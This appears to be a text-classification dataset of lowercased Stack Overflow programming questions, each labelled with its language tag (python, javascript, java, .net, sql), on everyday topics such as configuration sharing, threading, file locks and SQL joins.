access instance in other modules  i have a class instance i want to access in other modules. this class loads config values using configparser to update an class instance <code>__dict__</code> attribute as per this <a href= https://stackoverflow.com/questions/12620602/creating-a-class-with-all-the-elements-specified-in-a-file-using-configparser >post</a>:    i want to access this instance in other module. the instance is only created in the <code>main.py</code> file where it has access to the required parameters  which come via command line arguments.    i have three files: <code>main.py</code>  <code>config.py</code> and <code>file.py</code>. i don t know the best way to access the instance in the <code>file.py</code>. i only have access to it in <code>main.py</code> and not other modules.    i ve looked at the following answers  <a href= https://stackoverflow.com/questions/10942831/import-instance-of-class-from-a-different-module >here</a> and <a href= https://stackoverflow.com/questions/20888809/accessing-class-instance-from-another-module-python >here</a> but they don t fully answer my scenario.   <pre><code>#config.py class configuration():     def __init__(self  *import_sections):         #use configparser  get config for relevant sections  update self.__dict__  #main.py from config import configuration conf = configuration( general    dev ) # other lines of code use conf instance ... e.g. config.log_path in log setup  #file.py #i want to use config instance like this: class file():     def __init__(self  conf.feed_path):        # other code here... </code></pre>   options considered:   <ol> <li> <strong>initialise configuration in config.py module</strong>    in <code>config.py</code> after class definition i could add:   <pre><code>conf = configuration( general    dev ) </code></pre>   and in <code>file.py</code> and <code>main.py</code>:   <pre><code>from config import conf </code></pre>   but the <code>general</code> and <code>dev</code> variables are only found in <code>main.py</code> so doesn t look like it will work. </li> <li> <strong>make configuration class a function</strong>    i could make it a function and create a module-level dictionary and import     data into other modules:   <pre><code>#config.py conf = {} def set_config(*import_section):     # use configparser  update conf dictionary     conf.update(...)  </code></pre>   this would mean referring to it as <code>config.conf[ log_path ]</code> for example. i d prefer <code>conf.log_path</code> as it s used multiple times.  </li> <li> <strong>pass via other instances</strong>    i could pass the conf instance as parameters via other class instances from <code>main.py</code>  even if the intermediate instances don t use it. seems very messy. </li> <li> <strong>other options </strong>     can i use configuration as an instance somehow  </li> </ol>,python

is there a way of writing switch statements or other solutions for queryselectors   i currently have    <pre><code>if (element.queryselector( h1:first-child ) || element.queryselector( container )) {      removeborderclass(); }  if (element.queryselector( h3:first-child )) {      removeborderclass(); } </code></pre>   but obviously this is a bad practice in javascript.    can i use switch case   <pre><code>switch(element.queryselector())      case  h3:first-child  ||  container       break; //this is an example </code></pre>   or is there even better solution for this    <pre><code>&lt;section&gt;     &lt;h1&gt;h1 is first child of section&lt;/h1&gt;     //it should remove the border &lt;/section&gt;  &lt;section&gt;     &lt;h2&gt;h1 is first child of section&lt;/h2&gt;     //it should not remove the border &lt;/section&gt; </code></pre>,javascript
java - basic multithreading  i would like to ask  basic question about java threads. let s consider a producer - consumer scenario. say there is one producer  and n consumer. consumer arrive at random time  and once they are served they go away  meaning each consumer runs on its own thread. should i still use run forever condition for consumer      <pre><code>public class consumer extends thread {     public void run() {         while (true) {         }     } } </code></pre>   won t this keep thread running forever,java

adjusting container position with scrolling  i am attempting to make it so that a set of elements in a div container constantly are present in the a viewport. i have tried a couple of different approaches but they seem to have repainting issues.    <strong>question:</strong> any major optimizations to improve performance and remove the visual side effects that stand out  if not  then any alternative approaches     first approach:   <pre><code>    $(viewport).scroll(function ()     {         m_grid.css({  margintop : viewport.scrolltop() +  px  });     }) </code></pre>   this one causes tiny shaking effects that are obvious to the user.    second approach:   <ul> <li>place a div below and above the contents  shrink and expand them with a little rudimentary math to fill the unused space of the scrollable container.</li> </ul>   issue with this approach was that it causes flickering at the edges of the content most likely due to the constant resizing.    third approach:   <ul> <li>place a div that mimics the scrolling behavior directly over where the original scrollbar would be then simple bind scrolling events to it that forwards them to the actual container.</li> </ul>   issue with this one is that since the div that actually performs the scrolling is a fake  the mouse wheel wouldn t be usable since it would not have focus when hovering over the elements in the viewport.    any thoughts on improvements or alternate approaches  it has to be performance-centric.,javascript

how to read in a text file  create a dictionary  read in another text file and translate it with said dictionary and write it into a new file  hey guys so i m working on a (for me) complicated code and i m kinda stuck. the task is that i should write a programm which <strong>reads in a dictionary</strong> (file.txt is given)  and <strong>translate another text</strong> with this dictionary (also given so it must be read in too) and then <strong>save the translated</strong> text into a new file (which i gotta create).     i think i got it so far that the dictionary is read in but then i m pretty much lost. i was trying to do an if loop conditional (if the key is in the text i gotta translate  it should be replaced by the value) but i can t go on from there.    so here s what i got so far:   <pre><code>dictionary = {}  with open( dict.txt ) as dict:     for line in dict:         wordpair = line.split()         dictionary[wordpair[0]] = wordpair[1]  def get_translations(dict):     dict = get_translations( dict.txt )     return get_translations(dict)  def translate(dict  text1  trnsl):     with open( text1.txt ) as text1  open( trnsl.txt    w ) as trnsl:         for wordpair in dict:             if wordpair == true: #that s where i can t figure it out. </code></pre>   sidenote: if any word can t be translated from the given dictionary (because it s not part of the dictionary)  it should be indicated by these  &lt;> . i guess a simple else: print word +  &lt;>  would do      thanks for any suggestions!,python

what are the benefits of upgrading from .net 2.0 to .net 3.5   i need some help. my supervisor who is not a programmer asked me to prepare a document describing how our company would benefit from switching to .net 3.5 from .net 2.0. we re a small company and our it department consists of only 6 programmers. we write mainly windows forms  sometimes asp.net and compact framework apps. i would like to hear about pros and cons of this decision.  <h3>edit:</h3>  i personally know .net 3.5 i m just not sure how to convince my supervisor that we need it.  <h3>edit2:</h3>  please note that my supervisor is not a programmer (which is a really stupid situation but it s another story) so simply telling him that .net 3.5 has linq and other stuff tells him nothing.,.net
java: help understanding the correlation between a class s field and constructor  so i m pretty much still a beginner  and i ve been spending a lot time trying to truly understand the data structures and order of operations in java  breaking down with very small seemingly simple programs. i m having trouble deciphering why the compiler is rendering the result it does in the following code  i ve created a lot of mini programs utilizing jframes panels and actionlistener instances but now i find myself not understanding this  very small few lines of code:    <pre><code>public class classname{      static classname object = new classname();      static string word = ( word s literal );       public classname(){         system.out.println(word);     }      public static void main (string args[]){     } } </code></pre>   like i said  a very small seemingly simple program  the aspect i don t understand is the field   word . i understand that  although there s nothing in the main method  the compiler is going to read what s in the field  and in the field  we have object  which is a new instance of the class  and is also calling the constructor  hence we get an execution of the constructor s body.       that much is clear to me  however  what i don t understand is the fact that when you run this code  fieldletter executes as being equal to null. but when you remove the static invocation from the field   word   it suddenly has a value in the constructor call and happily prints   word s literal  this makes no sense to me. i understand the difference between static  where-by there is one existing instance of an element  and not declaring static to a field renders it non-static  so it can have many separate instances..but that still doesn t ring a bell as to why word is equal to null when it s static in the field  and the value i give it rings true when it s non-static in the field. can someone please explain this syntax to me  thank you!,java

extending .net system classes for backporting newer features to older platforms   i wrote a program in vs 2012 with default targeting for .net 4.5  and was later asked what is the absolutely minimal .net version required. re-targeting for 4.0 popped no errors  although 3.5 and earlier versions seemed not so compatible at first. but i knew for sure that i didn t use any “fundamentally” new feature  as i m freshly from vs 2005 (well  maybe a couple of linq statements which could be easily transformed into loops). in other words  none of those “new” features was beyond “syntactic / runtime sugar”  which could be implemented in earlier .net versions if only microsoft wanted to  or which could be implemented manually.    the most frequently used features are:  <li>enumerable.first / enumerable.single</li> <li>string.isnullorwhitespace</li> <li>operator =(system.type  system.type)</li>     i was wondering whether it is possible to extend system classes in a way that would not require rewriting of original code  and retain compatibility with the new .net version.   <h2>take 1. string.isnullorwhitespace</h2>   i tried to add a partial class definition:   <pre class= lang-vb prettyprint-override ><code>#if dotnet &lt;  4.0  then  namespace global.system      &lt;serializable&gt; _     &lt;runtime.interopservices.comvisible(true)&gt; _     partial public notinheritable class [string]         inherits object          public shared function isnullorwhitespace(byval stext as string) as boolean             return string.isnullorempty(stext) orelse string.isnullorempty(stext.trim)         end function      end class  end namespace  #end if </code></pre>   that had absolutely no effect. i know  one can just define such a function in an arbitrary class and then refer to it as <code>stringutil.isnullorwhitespace(...)</code>  but still looking for an alternate solution.   <h2>take 2. operator =(system.type  system.type)</h2>   as .net prior to version 4.0 did not implement “=” operator for type class  it was not possible to use it in <code>select case</code> (<code>switch</code>) constructs. so i again tried:   <pre class= lang-vb prettyprint-override ><code>#if dotnet &lt;  4.0  then  namespace global.system      &lt;serializable&gt; _     partial public mustinherit class [type]         inherits reflection.memberinfo          public shared operator =(byval otype1 as type  byval otype2 as type) as boolean             return otype1 is otype2         end operator          public shared operator &lt;&gt;(byval otype1 as type  byval otype2 as type) as boolean             return otype1 isnot otype2         end operator      end class  end namespace  #end if </code></pre>   it didn t help either  but did have some additional effect: when this block is hidden  only the “operator  =  is not defined for types  system.type  and  system.type ” compiler errors are shown  but then it is present  then other errors appear  such as “ isenum  is not a member of  system.type ” and my favorite “value of type  system.type  cannot be converted to  system.type ”. how can it be that at the same time it replaces genuine system.type with my partial definition  yet still does not see the “=” and “&lt;>” operators definition     yes  i know  i could revert to old-fashioned style:   <pre class= lang-vb prettyprint-override ><code>select case true     case is typeof obj is t1           ...     case is (typeof obj is t2) orelse (typeof obj is t3)           ... end select </code></pre>   but that is really ugly  and i always hated it. is there any way to retain the new and well-readable style with an older .net version,.net

program to count the number of times a word is entered then return the word and number of times used in descending order  the purpose is the create a program that will count the number of times a word is entered  while ignoring case and punctuation  then return the word along with the number of times it was entered to the console in descending order. currently  my program counts the number of letters and returns it to the console  but it does not ignore case or punctuation. i also am not sure how to add the sort function. thank you for your time / help.     edit: not sure what changed from original code  but when i ran it in eclipse this last time the punctuation and case were ignored by the counter. however  counter is still tracking letters instead of words.    <pre><code>public static void main(string[] args) {      string txt = readtext();     string[] words = txttowords(normalize(txt));      hashmap&lt;string  integer&gt; wordcount = countwords(words);      //print to console how many times each word was entered      system.out.println(txt +  was found  + wordcount +  times );  }     //increases word counter by 1 each time a duplicate word is entered public static hashmap&lt;string  integer&gt; countwords(string[] words) {     hashmap&lt;string  integer&gt; wordcount = new hashmap&lt;string  integer&gt;();     for (string word : words) {         if (wordcount.containskey(word)) {             int count = wordcount.get(word);             count = count + 1;             wordcount.put(word  count);         } else {             wordcount.put(word  1);         }     }     return wordcount; }  public static string[] txttowords(string txt) {     return txt.split(  ); }     //removes punctuation and ignores case when counting public static string normalize(string txt) {     txt = txt.replaceall( [^a-za-z ]     ).tolowercase();     return txt; }     //reads the text entered by the user public static string readtext() {     system.out.println( please enter the text to be processed. );     string stop =  *** last line *** ;     system.out.println( enter: \   + stop +  \  to stop );      stringbuilder results = new stringbuilder();     scanner input = new scanner(system.in);     while (true) {         string line = input.nextline();         if (line.contains(stop)) {             break;         } else {             results.append(line);         }     }     return results.tostring().trim(); } </code></pre>   },java

java: file is locked in application  in our program we can import a jar or fxml file to use custom javafx components. therefore the file is copied into a separate directory and the application only uses the copied file to process the scanning and so on.     in few cases it can happen  that for example the original jar was changed and it is rebuilded with maven with command  clean . so this would delete all necessary files  including the imported jar file. but if our application is still running  maven failes because the jar cannot be deleted. there seems to be a lock on the file  that prevent the jar from being deleted. only if we close the application first  the jar can finally be deleted.    so is there any way to release the file  so that it doesn t interupt any action on the file  even if the application is running      deleting the file already fails before the file is copied.    <strong>edit</strong>    ok  the hint with the scanning process was correct i think. before the jar is copied  the program scans the original jar to find the components that should be included. the file is locked right after a jarfile object is created.   <pre><code>public jarreport explore(classloader classloader) throws ioexception {     final jarreport result = new jarreport(jar);      try (jarfile jarfile = new jarfile(jar.tofile())) {         final enumeration&lt;jarentry&gt; e = jarfile.entries();         while (e.hasmoreelements()) {             final jarentry entry = e.nextelement();             result.getentries().add(exploreentry(entry  classloader));         }     }      return result; } </code></pre>   so in line 4  the jarfile object is created  which means the file was unzipped. right after this line  i cannot delete the jar anymore. so do i have to close the unzipped file before i can delete it,java

how to retain test results of a program when an output exception occurs   i need some input on the logic in my program. the logic of my program basically looks like this:   <pre><code>- ask user to select input file; -- if exception --&gt; error message  exit program; -- otherwise --&gt; continue program  perform tests; - after tests have been completed  ask user to select output file; -- if exception --&gt; error message  exit program; -- otherwise --&gt; save results to file  exit program; </code></pre>   the problem is that if the user specifies an invalid output file  all test results are lost and the program terminates. i would like to give the user a second attempt at selecting an output file if he selects an invalid output file.    my output code currently looks like this:   <pre><code>public void printtofile() {      jfilechooser outputfile;     file outfilename;      outputfile = new jfilechooser();      outputfile.showsavedialog(null);     outfilename = outputfile.getselectedfile();     try {         printstream outfile = new printstream(outfilename);         // print results to file     } catch (exception e) {         system.out.print( can t be saved to this file! \n );         system.exit(0); // exit program     } } </code></pre>   the only solution i can think of is to replace the <code>catch</code> block with the following code:   <pre><code>catch (exception e) {     system.out.print( can t be saved to this file! \n );     printtofile(); } </code></pre>   however  if the user doesn t understand what went wrong  he might select the same file over and over  thus creating a (sort of) infinite loop. is there any alternative to this method  or a way to prevent the loop  or is the method i came up with the way to go,java

python: ast.literal_eval() gives valueerror: malformed string  i ve read quite a few other posts on this forum regarding this particular error  but nothing has really helped me solve my problem.    basically i ve got something like this:   <pre><code>{  marie  :   (eng 80) (phy 65) (chem 80)  }  </code></pre>   i m trying to convert the above into:    <pre><code>[(eng 80) (phy 65) (chem 80)]  </code></pre>   so that i can access each grade of the tuple and add them up and return the result.    my attempt so far has been :   <pre><code>&gt;&gt;&gt; n={  marie  :   (eng 80) (phy 65) (chem 80)  } &gt;&gt;&gt; q= n.items() &gt;&gt;&gt; q [(  marie      (eng 80) (phy 65) (chem 80)  )] &gt;&gt;&gt; r=n.values()[0] &gt;&gt;&gt; r   (eng 80) (phy 65) (chem 80)   &gt;&gt;&gt; y=r.strip().split() &gt;&gt;&gt; y [ (eng 80)    (phy 65)    (chem 80) ] &gt;&gt;&gt; remove=   .join(y) &gt;&gt;&gt; remove  (eng 80) (phy 65) (chem 80)  &gt;&gt;&gt; list(ast.literal_eval(remove)) valueerror: malformed string </code></pre>   how can i achieve the desired result  is it possible to do so directly from the dictionary,python
python command line arguments file name  i have a script that first reads in a table data with pandas  then does some computations:   <pre><code>import numpy as np import sys import pandas as pd originaldata = pd.read_csv( ../file.txt   sep= \t   skiprows = 31) originaldata  = originaldata.fillna(0) .... (rest of the code)  </code></pre>   i would like to pass the file name in command line rather than typing it in the code each time there is a different file.  is my code right     <pre><code>import numpy as np import sys import pandas as pd filename = sys.argv[-1] originaldata = pd.read_csv( filename   sep= \t   skiprows = 31) originaldata  = originaldata.fillna(0) .... (rest of the code)  </code></pre>   so on the command line i would type:   <pre><code>$python  program1.py  file.txt  </code></pre>   <strong>update:</strong>     so from the comments i learned that one mistake is that the    <pre><code>originaldata = pd.read_csv( filename   sep= \t   skiprows = 31) </code></pre>   should be   <pre><code>originaldata = pd.read_csv(filename  sep= \t   skiprows = 31) </code></pre>   and instead of using sys.argv[-1]    argparse is more useful. so here i changed my code to:   <pre><code>import argparse parser = argparse.argumentparser(description= program1  ) parser.add_argument( -i   --input   help= input file name  required=true) originaldata = pd.read_csv(args.input   sep= \t   skiprows = 31) </code></pre>   note i m using anaconda  s spyder idle which contains the pandas module  for my program  it runs well within the idle but is having problem with command line. turns out anaconda uses pythonwin   so after setting path to pythonwin  on my command line i typed :    <pre><code>$pythonwin program1.py file.txt  </code></pre>   then a  python for win32  popped up and says  still can t get my hands on win32ui  . i m so confused now. does it have anything to do with me using a 64 bit computer,python

how does a manifest file work in .net apps   i was using ants profiler 4 and started it without admin rights in vista. the app threw a dialog box asking whether i want to create a manifest file so that the application always launches with admin rights (it needs it to function fully).    how would a manifest file look like  will it persist something like  adminrights = true   which means launch with admin rights  so everytimne the application opens  it will look at this file and if the value is  adminrights = true   as above  then launch with admin rights (a function dependent on the windows sdk  please correct).    how would this work  what code/file structure is involved  thanks.,.net

adding a condition to function so that it runs only in specific situations  i m working on a text game in javascript right now and have a function to pick up a sword.   <pre><code>var takesword = function() {         if (currentroom.hassword) {             $( &lt;p&gt;you picked up a sword.&lt;/p&gt; ).properdisplay();          }         else {             $( &lt;p&gt;the sword is not here.&lt;/p&gt; ).properdisplay();         }     }; </code></pre>   my problem is  as long as you re in the same room as the sword  you can pick it up over and over.  how can you set the function so that once you pick up the sword you can t pick it up again     my original thought was setting a variable like <code>var sword = false;</code> and then when the function runs to set <code>sword = true;</code> but that didn t work.    this isn t my entire code  there s an object further up that sets `hassword = true;  so that the sword can be picked up in the first place and can not be picked up in different rooms of the game.,javascript

sql - calling  reader.nextresult  causes a long delay  our application executes a long  hairy stored procedure with multiple result sets.  the users are experiencing long wait times for this query  so i set out to determine what is causing the delay.    i put a stopwatch on executing and reading the data  and it takes 6-7 seconds each time.  i timed the execution of the stored procedure   expecting that this would be taking all the time.  it wasn t - it took 30ms or so.    so i put timers around each of the ~20 result sets.  each  block  took very little time ( &lt; 10ms) except for one in the middle of the processing  which took 5-6 seconds.  upon further research  i discovered it was the  reader.nextresult()  call that took all the time.  this long delay happens in the same spot each time.    if i just exec the stored procedure  it seems to run real snappy  so it doesn t appear to be a problem with the query - but i don t know...    how do i interpret this   is sql shipping me the result sets as it gets them  and is the result set in question likely to be a problem area in my sql query   or is something else possibly causing the delay     edit:    thanks for the answer and the comments - i am using sql server and .net    what i was most curious about was why my delay happens on the  nextresult()  call.  being new to sql development  i assumed that a delay due to a long stored procedure execution would show up in my application while waiting for the  executereader()  call to return.  it now seems that sql will start returning data before the query is complete  and if there is a delay it will delay on the nextresult() call.    i started out thinking my delay was in the stored procedure.  when the executereader() call came back quickly  i thought my delay was in my code s handling of the reader.  when the delay ended up being on the nextresult() call  i was confused.  i am now back to reviewing the stored procedure.    thanks to those of you who took the time to review my problem and offered your help.,sql

python for loop with 10^8 iterations  i m sure this question has been asked before but i couldn t find it.    as part of a pretty simple programming problem in a homework assignment  i ve been told i need to loop 10^8 times. but any time i try to loop that many times my program (and whole computer) hangs.     since this is for a homework assignment  i won t share my actual code  but even this really basic script hangs on my computer:   <pre><code>for i in range(10**8): ... j = i </code></pre>   10^7 loops works fine. 10^8 always hangs.    i m not a new python user but i m not sure how to diagnose this. is it a memory-related issue  what are some strategies for fixing that  is it just a limit in python     i m using python 2.7 if that s relevant.     (also  for the record  the homework assignment has nothing to do with solving this problem. n=10^8 is just what my professor randomly chose.),python

python how to trim trailing spaces in csv dictreader keys  i am using python (2.6) csv dictreader. my input file has a header line where the column names have trailing spaces:   <pre><code>colname1       colname2      col3  etc. xx  yy  zz </code></pre>   the returned dict object has key() = <code>[ colname1    colname2         col3 ]</code>    is there an option to trim leading and trailing spaces from the keys     --edit    the problem arises in processing by key names:   <pre><code>with open(fname) as f:    r = csv.dictreader(f)    for row in r:       print  processing   r[ column1 ]  r[ column2 ] </code></pre>   the files are database dumps. and the dump program is way too smart - it adjust the output column width depending on data -- which means different sets of selects are going to have different column width and different key lengths. sometimes i must use <code>r[ column2     ]</code> and sometimes pad or reduce spaces. ouch!,python

javascript: tracing a function parent object hierarchy  in order to call it from the window context  i have a 3rd-party page with a complex  semi-obfuscated script generated by webpack.  it eventually calls a function  buried deep inside some object within an object within an array  etc. when debugging it i can see the line where the function is called at  but i want to trace the entire object hierarchy so i can call this function from the window context.     when debugging and breakpointing the relevant line  i get the call stack  but this doesn t help me reverse-engineer the way i can call this function  since it s buried within objects and arrays.    is there any way to trace this backwards  for example  maybe have the function object print its parents      thanks in advance.,javascript

considerations for running a .net windows application from a network share  with .net 3.5 sp1 we can now run windows applications over the network by default. even with the earlier versions  with some effort (setting up code access security)   we could run executables from a network share.     my question is  what are the implications of distributing applications by putting them on a network share. for  e.g. how is performance impacted  are there any more security considerations apart from cas etc.     and how does it compare with distributing applications by say  installing them locally by manually copying the files across or using smart client,.net

create a java calculator  one of the questions on my assignment is to create a calculator program to implement a solution which asks users to input a line of text containing a post-fix expression. the program should validate the input then evaluate this showing the expression evaluated (using infix notation) and the result.  if validation fails then a suitable error message should be shown. for example error: invalid expression.    this is my code so far: (how do i change the code so theres a loop where the user should be repeatedly prompted to enter an expression until they input an empty line  i.e. press return with no input  at which point the program should terminate    <pre><code>import java.util.scanner;  public class calculator {          public static void main(string[] args) {             try (scanner scanner = new scanner(system.in)) {                 system.out.println( enter a post-fix expression of the form 3 5 *: );                 double n1 = scanner.nextdouble();                 double n2 = scanner.nextdouble();                 string operation = scanner.next();                  switch (operation)  {                 case  + :                     system.out.println( your answer is   + (n1 + n2));                     break;                  case  - :                     system.out.println( your answer is   + (n1 - n2));                     break;                  case  / :                     system.out.println( your answer is   + (n1 / n2));                     break;                  case  * :                     system.out.println( your answer is   + (n1 * n2));                     break;                  }             }         } } </code></pre>,java

why not have a joinone keyword in sql to hint and enforce that each record has at most one match   i encounter this a lot when writing sql. i have two tables that are meant to be in a one-to-one relationship with each other  and i wish i could easily assert that fact in my query. for example  the simplified query:   <pre><code>select person.id  person.name  location.address1 from person left join location on person.locationid = location.id </code></pre>   when i read this query i think to myself  well what if the location table fails to enforce uniqueness on its id column  suddenly you could have the same person multiple times in your resultset. sure  i can go look at the schema to assure myself it s unique so everything will be okay  but why shouldn t i simply be able to put it right here in my query  a la:   <pre><code>select person.id  person.name  location.address1 from person left joinone location on person.locationid = location.id </code></pre>   not only would a keyword like this (made up  joinone ) make it 100% clear to a human reading this query that we are guaranteed to get exactly one row for each person record  but it lets the db engine optimize its execution plan because it knows there won t be more than one match each  even if the foreign key relationship isn t defined in the schema.    another advantage of this would be that the db engine could enforce it  so if the data actually did have more than one match  an error could be thrown. this happens for subqueries already  e.g.:   <pre><code>select person.id  person.name    (     select location.address1      from location      where location.id = person.location    ) as address1 from person </code></pre>   this is nice and spiffy  100% clear to the human reader  neatly optimizable  and enforced by the db engine. in fact i often end up doing things this way for all those reasons. the problem is  besides the distracting syntax  you can only select one field this way. (what if i want city  state  and zip too ) how nice it would be if you could flow this table right along with the rest of your joins and select any fields from it you wish in your select clause just like all the rest of your tables.    i couldn t find any other question like this around stackoverflow  though i did find lots of repeats of a close question: people wanting to <em>choose</em> a single record. close but really quite a different kind of goal  and less meaningful in my opinion.    i m posting this question to see if there s some mechanism already in the sql language that i m missing  or an efficient workaround anyone has come up with. the concept of a one-to-one vs. one-to-many relationship is so fundamental to relational database design  i m just so surprised at the absence of this language element.,sql

using mod operator. i wrote a script to reads an integer and to displays whether is an odd or even number  this is my first ever using mod operator. what i ve done so far is declare and initialize a variable and parsed the string to an integer. i used a if statements to determine whether the remainder is an even or odd number. then i used document.write to display the output for each if statement.     but the output is not showing in the browser. the error console message is that i have an invalid assignment on the left-hand side. i tried switching the left-hand side to the right-hand side but the error is still invalid on the left-hand side.     the other thing is i m not sure whether i should be using the parse since i read that the mod operator attempts to convert the string to a number. but i m a little confused on this.     anyway  here is the code: any suggestions    <pre><code>&lt; xml version = 1.0  encoding =  utf-8  &gt; &lt;!doctype html public  -//w3c//dtd xhtml 1.0 strict//en   http://www.w3.org/tr/xhtml1   /dtd/xhtml1-strict.dtd &gt; &lt;html xmlns -  http://www.w3.org/1999/xhtml&gt; &lt;html&gt; &lt;head&gt;   &lt;script type= text/javascript &gt;  //declare variables   var num = 18;   //converts to integer  num = parseint(num);   //write to output  if(num % 6 = 0){  document.write(% +  &lt;h2&gt; is an even number&lt;/h2&gt; );  }  if(num % 6 != 0){  document.write(% +  &lt;h2&gt; is a odd number&lt;/h2&gt; );  }   //end if    &lt;/script&gt;   &lt;/head&gt;  &lt;body&gt; </code></pre>,javascript

how do a sql count on an additional table inside a sql stored proc   i have a stored proc (called sprocgetarticles)  which returns a list of articles from the articles table. this stored proc does not have any parameters.    users can leave comments for each article and i store these comments in the comments table linked by the article id.    is there any way i can do a comment count for each articleid in the returned list from within the sprocgetarticles stored procedure so i only have to make one call to the database      my problem is that i need the article id to do the count which i seem unable to declare.    is this the best approach anyway,sql
how to add more than one variable to an sql  i have been working on this and i understand the declare statements  but i don t understand it when there needs to be more than 2 declare statments. i am supposed to update the discounts table to store #7896 where the type is initial customer  set the value of one variable equal to the amount of the maximum discount in the discount table. i named this variable <code>highdiscount</code>. set the value of the next variable equal to the store name that has the highest discount (found in step 2 above). i named this variable <code>storename</code>. multiply the maximum discount by 10% and put the result into the third variable. i named this variable <code>discountamount</code>. add the result from <code>discountamount</code> to the current max discount and assign the value to the fourth variable. i named this variable <code>totalnewdiscount</code>.    this is what i have:   <pre><code>use pubs   update dbo.discounts   set stor_id =  #7896     declare @highdiscount money;   set @highdiscount = (select max(discounts) from [dbo].discounts);   select @highdiscounts;    declare @ storename money;   set @storename =(select max(discounttype)from dbo.discounts)    declare @discountamount money;   set @discountamount = @discountamount * 10% </code></pre>   at the time this is what i have and am trying to figure out how to add the result from the discount amount to the current max discount and assign the value to the forth variable. i know i could do something like <code>set @totalnewdiscount = @discountamount + @highdiscount.</code> but to me i think i have declared too many variables. now am i able to have all the variables together but are they doing what they are suppose to do,sql

pushing items on stack and logging the current stack in a for(each) loop  i ve got the following problem and i can t seem to get why it s not working the way i think it should be working:   <pre><code>function iterate(somelist){       anotherlist = [];     for(i = 0; i &lt; somelist.length; i++){          anotherlist.push(somelist[i]);        console.log(anotherlist);     } } </code></pre>   what i would expect this to do is log an increasingly growing list  but instead it just prints the complete list several times  as if it first pushes all variable into anotherlist and afterwards starts the log function. it doesn t seem to matter wether i use a for or a foreach loop.    i really don t get why it works like this and can t seem to figure out a way to work around it.    thanks in advance <br> bart    by the way  somelist in this case is an object on which i iterate  and it seems to make a difference  as i tried it with a normal array and that seems to work.,javascript

base type vs base class  ok  so this question will probably get closed  but hell  its 4:30 in the morning and i can t sleep because i m still frustrated with my java midterm last night.  the test was an on-line thing and you get to see how you did immediately.    the test was poorly written with tons of typos and grammatical errors.  i don t normally care about that  except that when you add in vaguely phrased questions you aren t sure how to interpret the question anymore  since you can t assume you can parse it according to the normal rules of english.    one particular question that sticks in my craw:    what is the base type for collections   (it was written like that  with the capital c  which i think is important.)    the only two relevant possibilities were object and collections.  now i know that collections is the class from which most of the collection classes derive  so i initially selected that.  on my second run-through i thought  wait a minute. by base type  does he mean what is the base class from which collections derives  (after all  by capitalizing the c it indicated collections class in a specific sense  rather than just collections in a generic sense.) so i changed my answer to object  because i know that collections extends object.    turns out i was right the first time.    so my question  then: if i kvetch about this question  do i have a leg to stand on   or am i missing some distinction between base type and base class,java

why does .net il always create new string objects even when the higher level code references existing ones   <strong>background:</strong> we have an xml document containing thousands of pseudocode functions. i ve written a utility to parse this document and generate c# code from it. here s a greatly simplified snippet of the code that gets generated:   <pre><code>public class someclass {     public string func1() { return  some value ; }     public string func2() { return  some other value ; }     public string func3() { return  some value ; }     public string func4() { return  some other value ; }     // ... } </code></pre>   the important takeaway is each string value may get returned by multiple methods. i assumed that by making a minor change so that the methods would instead return references to static member strings  this would both cut down on the assembly size and reduce the memory footprint of the program. for example:   <pre><code>public class someclass {     private const string _some_value =  some value ;     private const string _some_other_value =  some other value ;     // ...      public string func1() { return _some_value; }     public string func2() { return _some_other_value; }     public string func3() { return _some_value; }     public string func4() { return _some_other_value; }     // ... } </code></pre>   but to my surprise  inspection using the .net <em>ildasm.exe</em> utility shows that in both cases the il for the functions is identical. here it is for one of them. either way  a hard-coded value gets used with <em>ldstr</em>:   <pre><code>.method public hidebysig instance string         func1() cil managed {   // code size       6 (0x6)   .maxstack  8   il_0000:  ldstr       some value    il_0005:  ret } // end of method someclass::func1 </code></pre>   in fact  the  optimized  version is slightly worse because it includes the static string members in the assembly. when i repeat this experiment using some other object type besides <strong>string</strong>  i see the difference that i expect. note that the assemblies are generated with optimization enabled.    <strong>question:</strong> why does .net apparently always create a new string object regardless of whether the code references an existing one,.net
current milliseconds  from long to int  i currently have the following code:   <pre><code>public static int currenttimemillis() {     long millislong = system.currenttimemillis();     while ( millislong &gt; integer.max_value )     {         millislong -= integer.max_value;     }     return (int)millislong; } </code></pre>   which returns the current time in an <code>int</code> format (not exactly  but it can be used for time differences). for very good reasons  i can t use <code>long</code>.     yes  i am just interested in the difference between two calls  and this approach works well. but it just looks wrong. i know that. and inefficient. i know. so my questions is  how can i improve it     i need a function that returns an <code>int</code> such that:   <pre><code>int x1 = currenttimemillis(); //my function long y1 = system.currenttimemillis();  .....  int x2 = currenttimemillis(); long y2 = system.currenttimemillis();  // here  x2 - x1 must be equal to y2 - y1 </code></pre>   edit:    fyi  i want to do this for benchmarking. i m running tests on multiple threads in parallel  the stop event is triggered by an external component. i m also serializing the data in a way that only supports <code>int</code>  and the object i m serializing can not have <code>long</code> members.,java

how to permutate two lists in python  here are two examples of lists   <pre><code>list = [[ mo    thu ]  [ we    fri ]  [ mo    mo ]] list2 = [[ mo    fri    fri ]  [ we    we ]] </code></pre>   so these lists come in random order. i ve given two examples here. what i want to do is compute all possible ways these lists can be permutated. on the level where it s list[1] * list[2] * list[3]. all possible combinations. a smaller example what i would like to reach is this:   <pre><code>list3 = [[ we    thu ] [ fri    thu ]] </code></pre>   -->    <pre><code>[[ we    fri ]  [ we    thu ]  [ thu    fri ]  [ thu    thu ]] </code></pre>   also  the lists are random so the amount of elements in the list or the nested lists can vary. i can python this out by alot of code but i was hoping there is an easier way to this.     cheers,python

what is the advantage that wrapping the request from web browser to server in an object  i read in the 70-515 book that  by wrapping the http request in a programmable object  asp.net provides your code access to things such as the cookies associated with your site  the query string parameters passed with the url  and the path to the requested resource  and allows you to work with other relevant request-based information.    but how it is possible by wrapping into an object gives you access to cookies etc..  can any one please explain....,.net

